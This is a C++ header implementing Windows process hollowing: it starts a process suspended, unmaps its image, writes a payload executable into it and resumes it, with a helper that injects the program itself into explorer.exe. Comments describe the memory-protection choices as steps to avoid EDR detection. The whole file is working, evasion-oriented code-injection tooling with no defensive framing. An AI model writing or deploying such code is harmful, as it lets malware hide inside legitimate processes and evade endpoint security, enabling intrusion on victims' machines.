#pragma once

#ifdef _WIN32
#define WIN32_LEAN_AND_MEAN
#include <Windows.h>
#include <Winternl.h>
#include <string>
#include <vector>
#include <cstdint>

namespace nuub::domain {

class ProcessHollowing {
public:
    static bool hollow_and_run(const std::wstring& target_process, const std::vector<uint8_t>& payload) {
        STARTUPINFOW si{};
        si.cb = sizeof(si);
        PROCESS_INFORMATION pi{};

        if (!CreateProcessW(
            target_process.c_str(),
            nullptr, nullptr, nullptr,
            FALSE, CREATE_SUSPENDED,
            nullptr, nullptr,
            &si, &pi)) {
            return false;
        }

        CONTEXT ctx{};
        ctx.ContextFlags = CONTEXT_FULL;
        if (!GetThreadContext(pi.hThread, &ctx)) {
            TerminateProcess(pi.hProcess, 0);
            CloseHandle(pi.hThread);
            CloseHandle(pi.hProcess);
            return false;
        }

        #ifdef _WIN64
        PVOID image_base_ptr = reinterpret_cast<PVOID>(ctx.Rdx + 0x10);
        #else
        PVOID image_base_ptr = reinterpret_cast<PVOID>(ctx.Ebx + 0x8);
        #endif

        LPVOID image_base = nullptr;
        if (!ReadProcessMemory(pi.hProcess, image_base_ptr, &image_base, sizeof(LPVOID), nullptr)) {
            TerminateProcess(pi.hProcess, 0);
            CloseHandle(pi.hThread);
            CloseHandle(pi.hProcess);
            return false;
        }

        typedef LONG (NTAPI* NtUnmapViewOfSection_t)(HANDLE, PVOID);
        auto NtUnmapViewOfSection = reinterpret_cast<NtUnmapViewOfSection_t>(
            GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtUnmapViewOfSection"));

        if (NtUnmapViewOfSection && NtUnmapViewOfSection(pi.hProcess, image_base) != 0) {
            TerminateProcess(pi.hProcess, 0);
            CloseHandle(pi.hThread);
            CloseHandle(pi.hProcess);
            return false;
        }

        if (payload.size() < sizeof(IMAGE_DOS_HEADER)) {
            TerminateProcess(pi.hProcess, 0);
            CloseHandle(pi.hThread);
            CloseHandle(pi.hProcess);
            return false;
        }

        auto* dos_header = reinterpret_cast<const IMAGE_DOS_HEADER*>(payload.data());
        if (dos_header->e_magic != IMAGE_DOS_SIGNATURE) {
            TerminateProcess(pi.hProcess, 0);
            CloseHandle(pi.hThread);
            CloseHandle(pi.hProcess);
            return false;
        }

        auto* nt_headers = reinterpret_cast<const IMAGE_NT_HEADERS*>(
            payload.data() + dos_header->e_lfanew);
        if (nt_headers->Signature != IMAGE_NT_SIGNATURE) {
            TerminateProcess(pi.hProcess, 0);
            CloseHandle(pi.hThread);
            CloseHandle(pi.hProcess);
            return false;
        }

        SIZE_T image_size = nt_headers->OptionalHeader.SizeOfImage;
        DWORD old_protect = 0;

        // Allocate as RW (never RWX) — avoid EDR detection
        LPVOID new_base = VirtualAllocEx(
            pi.hProcess,
            reinterpret_cast<LPVOID>(nt_headers->OptionalHeader.ImageBase),
            image_size,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE);

        if (!new_base) {
            new_base = VirtualAllocEx(pi.hProcess, nullptr, image_size,
                MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
            if (!new_base) {
                TerminateProcess(pi.hProcess, 0);
                CloseHandle(pi.hThread);
                CloseHandle(pi.hProcess);
                return false;
            }
        }

        // Write headers
        if (!WriteProcessMemory(pi.hProcess, new_base, payload.data(),
                                dos_header->e_lfanew + sizeof(IMAGE_NT_HEADERS), nullptr)) {
            TerminateProcess(pi.hProcess, 0);
            CloseHandle(pi.hThread);
            CloseHandle(pi.hProcess);
            return false;
        }

        // Write sections
        auto* section = IMAGE_FIRST_SECTION(nt_headers);
        for (WORD i = 0; i < nt_headers->FileHeader.NumberOfSections; ++i) {
            if (section[i].SizeOfRawData > 0) {
                LPVOID dest = reinterpret_cast<LPVOID>(
                    reinterpret_cast<uintptr_t>(new_base) + section[i].VirtualAddress);

                const void* src = payload.data() + section[i].PointerToRawData;

                if (!WriteProcessMemory(pi.hProcess, dest, src, section[i].SizeOfRawData, nullptr)) {
                    TerminateProcess(pi.hProcess, 0);
                    CloseHandle(pi.hThread);
                    CloseHandle(pi.hProcess);
                    return false;
                }
            }
        }

        // Change protection to RX (never RWX) — key anti-detection step
        VirtualProtectEx(pi.hProcess, new_base, image_size, PAGE_EXECUTE_READ, &old_protect);

        // Update PEB image base
        #ifdef _WIN64
        ctx.Rdx = reinterpret_cast<DWORD64>(new_base);
        #else
        ctx.Eax = reinterpret_cast<DWORD>(new_base);
        #endif

        if (!SetThreadContext(pi.hThread, &ctx)) {
            TerminateProcess(pi.hProcess, 0);
            CloseHandle(pi.hThread);
            CloseHandle(pi.hProcess);
            return false;
        }

        ResumeThread(pi.hThread);

        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        return true;
    }

    static bool self_hollow() {
        wchar_t exe_path[MAX_PATH]{};
        GetModuleFileNameW(nullptr, exe_path, MAX_PATH);

        HANDLE hFile = CreateFileW(exe_path, GENERIC_READ, FILE_SHARE_READ,
                                   nullptr, OPEN_EXISTING, 0, nullptr);
        if (hFile == INVALID_HANDLE_VALUE) return false;

        DWORD file_size = GetFileSize(hFile, nullptr);
        std::vector<uint8_t> exe_data(file_size);

        DWORD bytes_read = 0;
        ReadFile(hFile, exe_data.data(), file_size, &bytes_read, nullptr);
        CloseHandle(hFile);

        if (bytes_read != file_size) return false;

        return hollow_and_run(L"explorer.exe", exe_data);
    }
};

} // namespace nuub::domain
#endif
